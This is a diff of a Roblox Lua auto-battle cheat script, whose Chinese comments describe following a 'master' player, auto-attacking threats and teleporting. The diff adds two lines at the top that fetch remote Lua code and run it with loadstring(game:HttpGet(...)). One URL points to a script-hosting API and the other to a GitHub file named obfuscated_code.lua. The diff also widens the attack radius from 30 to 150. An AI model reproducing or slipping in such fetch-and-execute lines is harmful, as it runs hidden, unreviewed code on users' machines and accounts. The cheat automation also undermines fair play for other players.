@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/5659752fa0f7c10df56777eafd8f4813f15d3cde1b206f7e10f6b87af4fa9dfd/download"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alanbeikers9/scripts-ofuzado/refs/heads/main/obfuscated_code.lua"))()
+
 -- ╔══════════════════════════════════════════════════════╗
 -- ║           AutoBattle Script  v3.0  守卫模式          ║
 -- ║  平时跟随主人 · 自动识别威胁 · 动画反制 · 瞬移         ║
@@ -15,7 +19,7 @@ pcall(function() VIM = game:GetService("VirtualInputManager") end)
 -- ══════════════════════════════════════
 local CFG = {
     masterName        = "yaoshen21",    -- 主人玩家名（平时跟随，不攻击）
-    guardRadius       = 30,             -- 守卫范围：主人周围多少米内有敌人触发战斗(米)
+    guardRadius       = 150,             -- 守卫范围：主人周围多少米内有敌人触发战斗(米)
     masterFollowDist  = 4,              -- 跟随主人时保持的距离(米)
     masterDashRange   = 35,             -- 跟随时冲刺触发距离(米)
     dashDebounce      = 0.5,            -- 冲刺间隔(秒)
